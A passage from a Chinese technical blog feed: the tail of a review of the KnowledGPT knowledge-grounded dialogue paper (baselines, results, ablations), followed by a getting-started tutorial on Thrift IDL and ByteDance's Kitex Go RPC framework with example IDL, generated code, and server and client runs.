<p>人工评估：3 位注释者从流畅度、上下文连贯性和知识相关性三个方面判断回复的质量，并在 {0,1,2}（代表 “坏”、“一般” 和 “好”）中分配一个分数。</p>
<h3 id="基线">基线</h3>
<ul>
<li>Transformer Memory Network (TMN):
Wizard 数据集论文中提出的模型。</li>
<li>Incremental Transformer with Deliberation Decoder (ITDD):
对多轮对话和知识进行增量编码，并使用 Deliberation 技术解码响应。</li>
<li>Sequential Knowledge Transformer (SKT):
在最近的一篇论文中发表的具有最佳知识选择性能的顺序潜变量模型，作为 Wizard 数据的基线。</li>
<li>Disentangled Response Decoder (DRD):
通过预训练技术解决低资源挑战的模型。论文选择在预训练后使用完整训练数据对所有参数进行微调的一个版本作为基线，因为这样的配置会产生最好的性能。</li>
</ul>
<p>论文提出的模型名为 KnowledGPT。除了上述基线，为了验证提出的方法，论文对下面两个模型也进行实验比较：</p>
<ul>
<li><span class="math inline">\(GPT-2_{trunc}\)</span>：将上下文和相关知识连接成一个长输入，然后截断该输入以满足
GPT-2
模型的长度约束。这是为了检查简单的启发式方法是否适用于该任务。</li>
<li>SKT+GPT-2：我们将 SKT 选择的候选知识提供给 GPT-2
以生成回复。这是为了检查是否可以简单地用现成的知识选择模型替换知识选择模块。</li>
</ul>
<h3 id="实验结果">实验结果</h3>
<p>下两表分别展示了 Wizard 和 CMU DoG 的实验结果。 KnowledGPT
在两个数据集中的大多数指标上都达到了新的最先进水平，这证明了本文提出方法的有效性。
<span class="math inline">\(GPT-2_{trunc}\)</span> 比 KnowledGPT
差，原因是：</p>
<ul>
<li><strong>知识损失</strong>：论文发现在 53% 的测试示例（Test Seen+Test
Unseen）中，真实知识被移除了。 在这种情况下，GPT-2
只依赖于上下文、其他候选者中的相关知识（由于上下文和知识之间的一对多关系）以及包装在
GPT-2 参数中的知识进行响应，这 解释了 SKT 和 DRD 的可比性能。</li>
<li><strong>噪声输入</strong>：即使保留了真实知识，候选知识中的冗余和不相关信息仍然是有害的。</li>
</ul>
<p>KnowledGPT 在 Wizard 上的表现也优于 SKT+GPT-2，因为</p>
<ul>
<li>KnowledGPT 在知识选择上比 SKT
更准确，尽管它在学习中没有利用任何人工注释。事实上，SKT 在 Test Seen 和
Test Unseen 上知识选择的准确率分别为 26.8 和 18.3，而 KnowledGPT
这两个数字分别为 28.0 和 25.4</li>
<li> 在 KnowledGPT 中，知识选择和响应生成是联合优化的。</li>
</ul>
<p><img src="wizard-result.png"></p>
<p><img src="CMU-result.png"></p>
<p>下表展示了人工评估结果。虽然这三个模型在流畅度上具有可比性，但
KnowledGPT
在上下文连贯性和知识相关性方面都优于其他模型，这与自动指标的结果一致。</p>
<p><img src="human-evaluation.png"></p>
<h4 id="消融实验">消融实验</h4>
<p>为了了解学习策略对模型性能的影响，论文将完整的 KnowledGPT
与以下变体进行了比较：</p>
<ol type="1">
<li><strong>-pseudo</strong>：移除预热阶段</li>
<li><strong> -joint</strong>：移除联合优化阶段</li>
<li><strong> -reinforcement</strong>：g (U, D) 在<span class="math inline"> \(D_K\)</span> 上用 MLE 优化后固定</li>
<li><strong> -curriculum</strong>：GPT-2 在<span class="math inline"> \(D_G\)</span> 上用 MLE 优化后固定</li>
</ol>
<p>实验结果如下表所示。</p>
<p><img src="ablation-study.png"></p>
<p>可以得到以下结论：</p>
<ul>
<li><strong>伪标签预热对 Wizard 数据集很重要</strong>，移除后性能急速下降。这是因为在 Wizard 中，知识与人类反应之间存在很强的相关性。结果表明，尽管伪标签是用启发式方法构建的，但它仍然包含有价值的信息，允许联合优化从一个好的点开始。</li>
<li><strong>强化步骤和课程步骤是有用的</strong>。因为强化步骤允许知识选择模块更好地利用 GPT-2 的反馈，并且通过课程步骤 GPT-2 可以逐步利用知识选择模块的输出。</li>
<li><strong>联合优化是有意义的</strong>。去掉这个阶段会导致性能下降。</li>
</ul>
<p>此外，论文还对知识选择数量的上限<span class="math inline"> \(T_{max}\)</span> 做了实验。结果如下表。<span class="math inline">\(T_{max}\)</span> 越大，KnowledGPT 越有可能将真实候选知识纳入生成，PPL 越低。这也解释了为什么<span class="math inline"> \(GPT-2_{trunc}\)</span> 的 PPL 低于
KnowledGPT。另一方面，较大的 <span class="math inline">\(T_{max}\)</span> 也意味着生成的噪声更多。这就是为什么当
<span class="math inline">\(T_{max}\)</span> 超过一个值时，F1
开始下降。</p>
<p><img src="T-max.png"></p>
<h2 id="总结">总结</h2>
<p>论文将大规模的预训练语言模型应用于知识对话生成任务。为此，论文设计了一个知识选择模块，并提出了一种无监督方法来联合优化知识选择和响应生成。两个基准的评估结果表明，论文提出 KnowledGPT 模型实现了新的 SOTA。</p>
<p>这篇论文提出的联合优化策略，包括伪标签的构建、强化学习和课程学习，都让我眼前一亮。感觉还是蛮有启发性的工作。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话生成</category>
        <category>知识对话</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>GPT</tag>
        <tag>知识对话</tag>
        <tag>语言模型</tag>
      </tags>
  </entry>
  <entry>
    <title>RPC 微服务框架 Kitex 的入门实践</title>
    <url>/blog/2024/01/16/Kitex-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Kitex 是字节跳动开源的 Golang 微服务 RPC 框架，基于 Apache
Thrift，具有<strong>高性能</strong>、<strong>强可扩展</strong>的特点，在字节内部已广泛使用。本篇是 Kitex 入门系列的第一篇，梳理相关的概念，并从案例上手实践。
<span id="more"></span></p>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/"><code>Thrift</code></a>是一个<strong>轻量级</strong>、<strong>跨语言</strong>的<strong>远程服务调用（Remove
Procedure
Call，RPC）</strong>框架，最初由 <code>Facebook</code> 开发，后面进入 <code>Apache</code> 开源项目。它通过自身的 <code>IDL</code><strong>中间语言（Interface
Description Language，接口描述语言）</strong>,
并借助<strong>代码生成引擎</strong>生成各种主流语言的 <code>RPC</code><strong>服务端</strong> / <strong>客户端</strong>模板代码。</p>
<p>Thrift 的一大优势就是可以跨语言代码生成，支持 C++, Java, Python, PHP,
Ruby, Erlang, Perl, Haskell, C#, Cocoa, JavaScript, Node.js 等语言。</p>
<h3 id="架构">架构</h3>
<p>Thrift API 的客户端 - 服务端架构图如下所示：</p>
<ul>
<li>顶层是根据 IDL 生成的客户端 / 服务端代码</li>
<li>协议层（TProtocol）定义了序列化和反序列化的协议，包含 TBinaryProtocol
（二进制协议）、TCompactProtocol
（压缩二进制协议）、TJSONProtocol（JSON 文本）、TSimpleJSONProtocol
等</li>
<li>传输层（TTransport）定义了网络传输的方式，基于 TCP/IP 协议，包含 TSocket（阻塞 Socket）、TSimpleFileTransport（文件传输）、TFramedTransport（帧传输）等</li>
</ul>
<p><img src="Apache_Thrift_architecture.png"></p>
<h3 id="服务端模型">服务端模型</h3>
<p>Thrift 支持以下几种服务端模型：</p>
<ul>
<li>TSimpleServer：简单的单线程服务模型，常用于测试；</li>
<li>TThreadedServer：多线程服务模型，每个连接新建线程，使用标准阻塞 IO；</li>
<li>TThreadPoolServer：多线程服务模型，使用<strong>线程池</strong>，使用标准的阻塞式 IO；</li>
<li>TNonblockingServer：多线程服务模型，使用非阻塞式 IO（需使用 TFramedTransport 数据传输方式）；</li>
</ul>
<h3 id="idl">IDL</h3>
<h4 id="基础数据类型"><strong>基础数据类型</strong></h4>
<ul>
<li>bool：布尔型（true or false）；</li>
<li>byte：8bit、有符号整型。</li>
<li>i16、i32、i64：16/32/64 bit 有符号整型。</li>
<li>double：64 位浮点数</li>
<li> string：UTF-8 字符串</li>
</ul>
<p>没有定义无符号整数类型，因为很多语言中没有原生的无符号整数类型。</p>
<h4 id="特殊类型"><strong>特殊类型</strong></h4>
<ul>
<li>binary：字节序列</li>
</ul>
<h4 id="结构体"><strong>结构体</strong></h4>
<p>使用 struct 定义，一系列字段的集合，不支持继承。一个例子如下所示。结构体中每个字段需要用唯一的整型标识，用于序列化与反序列化，可以通过 <code>required/optional</code> 关键字定义字段是否必须，可以用 <code>=</code> 指定默认值。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">struct Work {</span><br><span class="line">  1: i32 num1 = 0</span><br><span class="line">  2: required i32 num2</span><br><span class="line">  3: string op</span><br><span class="line">  4: optional string comment</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>Thrift 支持以下三种字段必要性标识，决定了序列化和反序列化的行为：</p>
<p><strong>required</strong></p>
<ul>
<li>写：字段总是被写入，需要被赋值</li>
<li>读：字段总是被读取，输入流中必须包含，如果缺失则会<strong>抛出异常</strong>或者返回 error</li>
<li> 默认值：总是被写入</li>
<li> required 字段会限制版本的平滑过渡。如果新增 / 移除了 required 字段，都可能导致读取失败。</li>
</ul>
<p><strong>optional</strong></p>
<ul>
<li>写：只有被设置了才会被写入</li>
<li>读：可能出现在输入流中，也可以不存在</li>
<li>默认值：只有当设置了 <code>isset</code> 标识才会写入</li>
<li>很多语言的实现中，使用 <code>isset</code> 标识可选字段是否被赋值。只有设置了这个标识的字段才会被写入，反过来只有输入流中存在该字段才会设置 <code>isset</code></li>
</ul>
<p><strong>default（隐式默认）</strong></p>
<ul>
<li>写：理论上，总是被写入，除非特殊情况</li>
<li>读：与 optional 类似，可能出现在输入流中，也可以不存在</li>
<li>默认值：可能不会被写入</li>
</ul>
<p>default 类似 required 和 optional 的混合，取决于具体的实现。例如，实现中可以不写入默认值，因为假设读取时会自动补充默认值；也可以写入默认值，没有限制不能这么做。</p>
<p>需要注意的是，未写入的默认值成为了 idl 版本的一部分，如果后续默认值出现了变更，接口就会发生变化。而如果默认值被写入了，即使 IDL 中的默认值改变，也不会影响序列化数据。</p>
<ul>
<li>也就是说，不把默认值写入，读取侧只能依赖于 idl 中的默认值填充。写入了默认值，读取侧就可以只从数据中读取了。</li>
</ul>
<h4 id="容器"><strong>容器</strong></h4>
<ul>
<li>map&lt;type1,type2&gt;：键值字典</li>
<li> list&lt;type&gt;：有序列表</li>
<li> set&lt;type&gt;：无序集合</li>
</ul>
<p>理论上，容器的类型可以是任意合法的 Thrift 类型。但为了兼容性考虑，map 的 key 应当是基础类型。这是由于一些语言不允许复杂的键类型。此外，JSON 中也只支持基础类型的 key。</p>
<h4 id="异常">异常</h4>
<p>异常在语法和功能上类似于结构体，只不过异常使用关键字 exception 而不是 struct 关键字声明。但它在语义上不同于结构体，当定义一个 RPC 服务时，开发者可能需要声明一个远程方法抛出一个异常。在 Golang 中，不使用异常机制，因此可以忽略。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">exception InvalidOperation {</span><br><span class="line">  1: i32 what,</span><br><span class="line">  2: string why </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="服务">服务</h4>
<p>服务类似于接口，是一系列抽象函数的集合。函数的声明与 C 中文法类似，返回类型在最前，然后是函数名、参数列表（每个参数需要整型 id 标识）。一个例子如下所示，函数可以使用 <code>oneway</code> 标识符表示 client 发出请求后不必等待结果，也就是异步调用。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">//“Twitter”与“{”之间需要有空格！！！</span><br><span class="line">service Twitter {</span><br><span class="line">    // 方法定义方式类似于C语言中的方式，它有一个返回值，一系列参数和可选的异常</span><br><span class="line">    // 列表. 注意，参数列表和异常列表定义方式与结构体中域定义方式一致.</span><br><span class="line">    void ping()                       // 函数定义可以使用逗号或者分号标识结束</span><br><span class="line">    bool postTweet(1:Tweet tweet)    // 参数可以是基本类型或者结构体，参数是只读的（const），不可以作为返回值！！！</span><br><span class="line">    TweetSearchResult searchTweets(1:string query) // 返回值可以是基本类型或者结构体</span><br><span class="line">    // ”oneway”标识符表示client发出请求后不必等待回复（非阻塞）直接进行下面的操作，</span><br><span class="line">    // ”oneway”方法的返回值必须是void</span><br><span class="line">    oneway void zip()               // 返回值可以是void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>service 可以通过 <code>extends</code> 关键字继承另一个 service。</p>
<h4 id="枚举类型">枚举类型</h4>
<p>使用 <code>enum</code> 关键字定义</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">TweetType</span> </span>{</span><br><span class="line">    TWEET,         <span class="comment">// 编译器默认从1开始赋值</span></span><br><span class="line">    RETWEET = <span class="number">2</span>,  <span class="comment">// 可以赋予某个常量某个整数</span></span><br><span class="line">    DM = <span class="number">0xa</span>,     <span class="comment">//允许常量是十六进制整数</span></span><br><span class="line">    REPLY         <span class="comment">// 末尾没有逗号</span></span><br><span class="line">}        </span><br></pre></td></tr></tbody></table></figure>
<p>令人难过的是，Golang 中没有原生的枚举类型。</p>
<h4 id="常量">常量</h4>
<p>使用 <code>const</code> 关键字定义，复杂的类型和结构体可使用 JSON 形式表示。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> i32 INT_CONST = <span class="number">1234</span>;    <span class="comment">// 分号是可选的</span></span><br><span class="line"><span class="keyword">const</span> <span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="built_in">string</span>&gt; MAP_CONST = {<span class="string">"hello"</span>: <span class="string">"world"</span>, <span class="string">"goodnight"</span>: <span class="string">"moon"</span>}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="类型别名">类型别名</h4>
<p>与 C 类似，可以使用 <code>typedef</code> 关键字为类型声明别名</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> i32 MyInteger </span><br></pre></td></tr></tbody></table></figure>
<h4 id="命名空间">命名空间</h4>
<p><code>namespace</code> 关键字，可以为每种语言单独声明，用于隔离代码（例如 Go
module、Java package 等），语法如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">namespace cpp com.example.project </span><br><span class="line">namespace java com.example.project </span><br></pre></td></tr></tbody></table></figure>
<h4 id="最佳实践">最佳实践</h4>
<ul>
<li>struct 中任何新加的字段都不能是 <code>required</code>，以防新旧版本不兼容出现的报错。</li>
<li>不要修改 struct 中已有字段的 id 值。</li>
<li>非必须的字段可以移除，但 id 值不要复用。更好的方式是使用 <code>OBSOLETE_</code>前缀标识已被废弃。</li>
<li>可以更改默认值，但要牢记默认值不会序列化，接收方会使用自身的 idl 填充默认值，导致不一致。</li>
</ul>
<h2 id="kitex">Kitex</h2>
<h3 id="架构-1">架构</h3>
<p>Thrift 可以实现 idl 的定义与客户端 / 服务端代码生成，通过传输层和协议层完成 RPC 交互，但缺失 RPC 框架的高级特性，例如服务注册、发现、监控等。为此，字节结合内部的治理能力，开发了 <a href="https://www.cloudwego.io/zh/docs/kitex/overview/"><code>Kitex</code></a>框架，架构如下所示：</p>
<p><img src="kitex_arch.png"></p>
<p>可以看到，Kitex 以模块化的方式，支持服务注册 / 发现、负载均衡、熔断、限流、重试、监控、链路跟踪、日志、诊断等服务治理模块，大部分均已提供默认扩展，使用者可选择集成。</p>
<p>此外，Kitex 还支持不同的第三方包，例如使用了自研的高性能网络库 <a href="https://github.com/cloudwego/netpoll">Netpoll</a>，通过 epoll + 协程池，提高网络 IO 性能。KItex 也支持多种消息协议，包含 <strong>Thrift</strong>、<strong>Kitex
Protobuf</strong>、<strong>gRPC</strong> 等，以及多种传输协议，包含
<strong>TTHeader</strong>、<strong>HTTP2</strong> 等。</p>
<h3 id="快速上手">快速上手</h3>
<p>按照<a href="https://www.cloudwego.io/zh/docs/kitex/getting-started/">快速开始
| CloudWeGo</a> 安装 Go 环境与 kitex 工具。</p>
<p>新建项目 <code>kitex_started</code>，新建如下的 idl 文件 <code>hello.thrift</code>：</p>
<figure class="highlight thrift"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> go hello_world</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">HelloType</span> </span>{</span><br><span class="line">    Morning = <span class="number">1</span>,</span><br><span class="line">    Noon = <span class="number">2</span>,</span><br><span class="line">    Afternoon = <span class="number">3</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Request</span> </span>{</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">required</span> <span class="built_in">i64</span> id,</span><br><span class="line">    <span class="number">2</span>: <span class="keyword">required</span> <span class="built_in">string</span> message,</span><br><span class="line">    <span class="number">3</span>: <span class="keyword">optional</span> HelloType type,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Response</span> </span>{</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">required</span> <span class="built_in">string</span> message,</span><br><span class="line">    <span class="number">2</span>: <span class="keyword">optional</span> <span class="built_in">string</span> error,</span><br><span class="line">    <span class="number">3</span>: <span class="keyword">optional</span> list&lt;<span class="keyword">i64</span>&gt; ids,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddRequest</span> </span>{</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">required</span> <span class="built_in">i64</span> first,</span><br><span class="line">    <span class="number">2</span>: <span class="keyword">required</span> <span class="built_in">i64</span> second,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddResponse</span> </span>{</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">required</span> <span class="built_in">i64</span> sum,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Hello</span> </span>{</span><br><span class="line">    Response echo(<span class="number">1</span>: Request req),</span><br><span class="line">    AddResponse add(<span class="number">1</span>: AddRequest req),</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在 idl 中，定义了一个服务，两个函数。然后使用如下命令进行代码生成，<code>-module</code> 用于指定包名，需要与 <code>go.mod</code> 中的一致，<code>-service</code> 表示生成服务端代码，并指定了<strong>服务名</strong>，最后是 idl 的路径。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">kitex -module <span class="string">"kitex_started"</span> -service a.b.c hello.thrift</span><br></pre></td></tr></tbody></table></figure>
<p>接着会发现，<code>go.mod</code> 包含以下内容，注意 replace 一行是由于 kitex 使用的是 0.13.0 版本的 thrift，高版本的不兼容。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">module kitex_started</span><br><span class="line"></span><br><span class="line">go 1.21</span><br><span class="line"></span><br><span class="line">replace github.com/apache/thrift =&gt; github.com/apache/thrift v0.13.0</span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">	github.com/apache/thrift v0.13.0</span><br><span class="line">	github.com/cloudwego/kitex v0.8.0</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>
<p>接着，运行 <code>go mod
tidy</code> 安装依赖，就不会有红线报错了。我们得到了如下的项目结构：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">❯ tree -r                                                                                                          </span><br><span class="line">.</span><br><span class="line">├── script</span><br><span class="line">│&nbsp;&nbsp; └── bootstrap.sh</span><br><span class="line">├── main.go</span><br><span class="line">├── kitex_info.yaml</span><br><span class="line">├── kitex_gen</span><br><span class="line">│&nbsp;&nbsp; └── hello_world</span><br><span class="line">│&nbsp;&nbsp;     ├── k-hello.go</span><br><span class="line">│&nbsp;&nbsp;     ├── k-consts.go</span><br><span class="line">│&nbsp;&nbsp;     ├── hello.go</span><br><span class="line">│&nbsp;&nbsp;     └── hello</span><br><span class="line">│&nbsp;&nbsp;         ├── server.go</span><br><span class="line">│&nbsp;&nbsp;         ├── invoker.go</span><br><span class="line">│&nbsp;&nbsp;         ├── hello.go</span><br><span class="line">│&nbsp;&nbsp;         └── client.go</span><br><span class="line">├── idl</span><br><span class="line">│&nbsp;&nbsp; └── hello.thrift</span><br><span class="line">├── handler.go</span><br><span class="line">├── go.sum</span><br><span class="line">├── go.mod</span><br><span class="line">└── build.sh</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="handler.go">handler.go</h3>
<p>服务的实现类，<code>$HelloImpl</code> 实现了 idl 中的 <code>Hello</code> 接口，不同的是，参数列表中增加了透传的 context，以及返回值中增加了 error。我们需要在这里实现业务逻辑。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"context"</span></span><br><span class="line">	hello_world <span class="string">"kitex_started/kitex_gen/hello_world"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloImpl implements the last service interface defined in the IDL.</span></span><br><span class="line"><span class="keyword">type</span> HelloImpl <span class="keyword">struct</span>{}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Echo implements the HelloImpl interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *HelloImpl)</span> <span class="title">Echo</span><span class="params">(ctx context.Context, req *hello_world.Request)</span> <span class="params">(resp *hello_world.Response, err error)</span></span> {</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Your code here...</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add implements the HelloImpl interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *HelloImpl)</span> <span class="title">Add</span><span class="params">(ctx context.Context, req *hello_world.AddRequest)</span> <span class="params">(resp *hello_world.AddResponse, err error)</span></span> {</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Your code here...</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="main.go">main.go</h3>
<p>项目的入口，代码很简单，新建了一个 server 并开始运行。注意这里 import 的路径不同，虽然都被重命名为了 <code>hello_world</code></p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	hello_world <span class="string">"kitex_started/kitex_gen/hello_world/hello"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	svr := hello_world.NewServer(<span class="built_in">new</span>(HelloImpl))</span><br><span class="line"></span><br><span class="line">	err := svr.Run()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		log.Println(err.Error())</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="kitex_info.yaml">kitex_info.yaml</h3>
<p>包含了服务名和版本信息。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">kitexinfo:</span></span><br><span class="line">   <span class="attr">ServiceName:</span> <span class="string">'a.b.c'</span></span><br><span class="line">   <span class="attr">ToolVersion:</span> <span class="string">'v0.8.0'</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="kitex_gen">kitex_gen</h3>
<p><code>hello_world</code> 包（idl 中的 namespace）下，有以下文件 / 目录：</p>
<ul>
<li><code>hello.go</code>：定义了 idl 中的各种类型，例如 <code>HelloType,Request,Response</code> 等，提供了 <code>Get/Set,
Read/Write</code> 方法</li>
<li><code>k-consts.go</code>：没什么用</li>
<li><code>k-hello.go</code>：各种类型的 FastRead/FastWrite
编解码实现，性能更好</li>
<li><code>hello/</code>：Hello Service 相关代码
<ul>
<li><code>client.go</code>：暴露 <code>NewClient</code> 函数，新建实现了 <code>Hello</code> 接口的 Client 对象</li>
<li><code>hello.go</code>：暴露 <code>NewServiceInfo</code> 函数，Service 信息，注意服务名是 idl 中的 Service，即 <code>Hello</code></li>
<li><code>server.go</code>：暴露 <code>NewServer</code> 函数，用于启动服务</li>
<li><code>invoker.go</code>：暴露 <code>NewInvoker</code> 函数，没有找到用法</li>
</ul></li>
</ul>
<p>分析目录结构可以看出，当我们需要新建某个 Service 的 Client/Server 时，需要 import 对应的 Service 包，使用 <code>NewClient/NewServer</code> 函数；如果只是使用 idl 中定义的结构体，只需要 import 对应 namespace 的包即可。这也解释了上面 import 路径的不同。</p>
<h3 id="运行">运行</h3>
<p>填好 handler 逻辑：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Echo implements the HelloImpl interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *HelloImpl)</span> <span class="title">Echo</span><span class="params">(ctx context.Context, req *hello_world.Request)</span> <span class="params">(resp *hello_world.Response, err error)</span></span> {</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Your code here...</span></span><br><span class="line">	resp = &amp;hello_world.Response{Message: fmt.Sprintf(<span class="string">"Receive: %s"</span>, req.Message)}</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add implements the HelloImpl interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *HelloImpl)</span> <span class="title">Add</span><span class="params">(ctx context.Context, req *hello_world.AddRequest)</span> <span class="params">(resp *hello_world.AddResponse, err error)</span></span> {</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Your code here...</span></span><br><span class="line">	resp = &amp;hello_world.AddResponse{Sum: req.First + req.Second}</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在 <code>client/main.go</code> 编写客户端代码：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Copyright 2021 CloudWeGo Authors</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the "License");</span></span><br><span class="line"><span class="comment">// you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">// You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//     http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">// distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">// See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">// limitations under the License.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"context"</span></span><br><span class="line">	<span class="string">"kitex_started/kitex_gen/hello_world"</span></span><br><span class="line">	<span class="string">"kitex_started/kitex_gen/hello_world/hello"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/cloudwego/kitex/client"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	client, err := hello.NewClient(<span class="string">"Hello"</span>, client.WithHostPorts(<span class="string">"0.0.0.0:8888"</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">for</span> {</span><br><span class="line">		req := &amp;hello_world.Request{</span><br><span class="line">			Id:      <span class="number">1</span>,</span><br><span class="line">			Message: <span class="string">"my request"</span>,</span><br><span class="line">		}</span><br><span class="line">		resp, err := client.Echo(context.Background(), req)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		}</span><br><span class="line">		log.Println(resp)</span><br><span class="line">		time.Sleep(time.Second)</span><br><span class="line">		addReq := &amp;hello_world.AddRequest{First: <span class="number">512</span>, Second: <span class="number">512</span>}</span><br><span class="line">		addResp, err := client.Add(context.Background(), addReq)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		}</span><br><span class="line">		log.Println(addResp)</span><br><span class="line">		time.Sleep(time.Second)</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>kitex
server 默认监听端口为 8888，可以通过 <code>WithServiceAddr</code> 配置。接着，在项目根目录运行 <code>go
run
.</code> 命令，可以观察到如下输出，证明服务端已启动，监听 8888 端口：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">❯ go run .</span><br><span class="line">2024/01/17 20:02:44.944884 server.go:83: [Info] KITEX: server listen at addr=[::]:8888</span><br></pre></td></tr></tbody></table></figure>
<p>在另一个 shell 中运行 <code>go run
client/main.go</code>，可以得到如下输出：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">❯ go run client/main.go                                                                                             </span><br><span class="line">2024/01/17 20:02:51 Response({Message:Receive: my request Error:&lt;nil&gt; Ids:[]})</span><br><span class="line">2024/01/17 20:02:52 AddResponse({Sum:1024})</span><br></pre></td></tr></tbody></table></figure>
<p>证实客户端请求成功到达服务端，并正确处理返回。</p>
<h2 id="总结">总结</h2>
